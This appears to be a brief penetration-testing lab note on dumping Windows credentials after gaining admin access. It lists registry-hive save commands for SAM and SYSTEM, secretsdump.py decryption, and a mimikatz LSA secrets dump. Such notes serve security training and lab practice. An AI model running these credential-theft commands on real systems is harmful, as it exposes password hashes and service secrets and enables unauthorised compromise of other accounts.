be admin
### **Admin Credentials Found**

- **Context:** Admin credentials for `Jeor.mormont` were discovered in `C:\setup`.

---

### **Dumping Credentials Locally**

1. **Dump Registry Hives:**
   - **Commands:**
     ```plaintext
     reg save HKLM\SAM c:\sam
     reg save HKLM\SYSTEM c:\system
     ```
   - **Decrypt with Secretsdump:**
     ```plaintext
     secretsdump.py -sam c:\sam -system c:\system LOCAL
     ```
   - **Output:** Look for the NT hash, which is crucial for password cracking or reuse.

2. **Using a Custom LSASS Dumper:**
   - **Context:** Alternatively, use a custom LSASS dumper to extract credentials directly from memory.

---

### **Dumping LSA Secrets**

- **Extract LSA Secrets:**
  - **Purpose:** Retrieve machine account hashes, service credentials, and DPAPI keys.
  - **Example Command:**
    ```plaintext
    mimikatz "lsadump::lsa /inject"
    ```
  - **Use Case:** Extract sensitive information like SQL passwords and encryption keys.

---

This note outlines methods to dump and decrypt credentials from registry hives or LSASS memory, enabling further compromise of the system.